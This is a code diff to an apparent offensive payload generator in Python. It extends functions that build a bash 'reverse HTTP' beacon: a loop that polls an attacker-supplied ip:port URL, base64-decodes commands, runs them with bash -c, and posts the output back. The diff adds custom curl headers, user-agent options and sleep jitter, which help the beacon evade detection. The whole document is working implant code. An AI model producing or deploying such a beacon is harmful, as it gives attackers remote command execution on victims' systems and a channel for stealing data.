@@ -10,9 +10,13 @@ brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
 brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
 brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
 
-def make_raw(beacon_url, interval):
-	# … your template build here (same as before) …
-	
+def make_raw(beacon_url, interval, curl_opts=None, jitter=0):
+	extra_curl = " ".join(curl_opts) + " " if curl_opts else ""
+	if jitter and jitter > 0:
+		sleep_cmd = f'sleep $(( INTERVAL + (RANDOM % (INTERVAL * {jitter} / 100 + 1)) ))'
+	else:
+		sleep_cmd = 'sleep "$INTERVAL"'
+
 	parts = []
 
 	# ─── 1) gen_sid() ────────────────────────────────────────────────────────────────
@@ -22,17 +26,16 @@ def make_raw(beacon_url, interval):
 	parts.append(f'BEACON_URL="{beacon_url}"')
 	parts.append(f'INTERVAL={interval}')
 	parts.append('SID=$(gen_sid)')
-	#parts.append('echo "[*] Session: $SID"')
 
 	# ─── 3) Loop fetch & exec ───────────────────────────────────────────────────────
-	parts.append(r"""while :; do resp=$(curl -s -H "X-Session-ID: $SID" --noproxy "*" "$BEACON_URL"); cmd_b64=$(printf "%s\n" "$resp" | sed -n '\''s/.*"cmd"[[:space:]]*:[[:space:]]* "\([^"]*\)".*/\1/p'\'');  if [ -n "$cmd_b64" ]; then cmd=$(printf "%s" "$cmd_b64" | base64 -d); output=$(bash -c "$cmd" 2>&1); out_b64=$(printf "%s" "$output" | base64 | tr -d '\''\n'\''); body=$(printf '\''{"output":"%s"}'\'' "$out_b64"); curl -s -X POST -H "X-Session-ID: $SID" -H "Content-Type: application/json" --data "$body" --noproxy "*" "$BEACON_URL" >/dev/null; fi; sleep "$INTERVAL"; done""")
+	parts.append(f"""while :; do resp=$(curl -s {extra_curl}-H "X-Session-ID: $SID" --noproxy "*" "$BEACON_URL"); cmd_b64=$(printf "%s\\n" "$resp" | sed -n '\\''s/.*"cmd"[[:space:]]*:[[:space:]]* "\\([^"]*\\)".*/\\1/p'\\'');  if [ -n "$cmd_b64" ]; then cmd=$(printf "%s" "$cmd_b64" | base64 -d); output=$(bash -c "$cmd" 2>&1); out_b64=$(printf "%s" "$output" | base64 | tr -d '\\''\\n'\\''); body=$(printf '\\''{{\"output\":\"%s\"}}'\\''" "$out_b64"); curl -s -X POST {extra_curl}-H "X-Session-ID: $SID" -H "Content-Type: application/json" --data "$body" --noproxy "*" "$BEACON_URL" >/dev/null; fi; {sleep_cmd}; done""")
 
 	inner = "; ".join(parts)
 	return f"bash -c '{inner}'"
 
 
 
-def generate_bash_reverse_http(ip, port, obs, beacon_interval):
+def generate_bash_reverse_http(ip, port, obs, beacon_interval, headers=None, useragent=None, accept=None, byte_range=None, jitter=0):
 	beacon_url = f"http://{ip}:{port}/"
 	interval = beacon_interval
 
